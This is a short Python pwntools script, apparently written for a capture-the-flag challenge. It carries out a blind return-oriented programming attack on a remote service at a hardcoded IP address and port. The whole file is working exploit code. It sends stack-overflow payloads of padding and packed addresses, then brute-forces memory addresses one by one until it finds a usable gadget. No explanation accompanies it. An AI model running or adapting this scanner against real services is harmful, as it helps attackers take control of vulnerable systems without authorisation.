from pwn import *

def get_brop_gadget(length, stop_gadget, addr):
    try:
        sh = remote("34.92.37.22",10000)
        sh.recvuntil('!\n')
        payload = 'a'*length+p64(addr)+p64(0)*6+p64(stop_gadget)+p64(0)*10
        sh.sendline(payload)
        content = sh.recv()
        sh.close()
        print content
        # stop gadget returns memory
        if not content.startswith('Welcome'):
            return False
        return True
    except Exception:
        sh.close()
        return False


def check_brop_gadget(length, addr):
    try:
        sh = remote("34.92.37.22",10000)
        sh.recvuntil('!\n')
        payload = 'a'* length + p64(addr) + 'a' * 8 * 10
        sh.sendline(payload)
        content = sh.recv()
        sh.close()
        return False
    except Exception:
        sh.close()
        return True


##length = getbufferflow_length()
length = 40
##get_stop_addr(length)
stop_gadget = 0x400570
addr = 0x4006ce
brop_gadget = 0x40077a
while 1:
    print hex(addr)
    if get_brop_gadget(length, stop_gadget, addr):
        print 'possible brop gadget: 0x%x' % addr
        if check_brop_gadget(length, addr):
            print 'success brop gadget: 0x%x' % addr
            break
    addr += 1
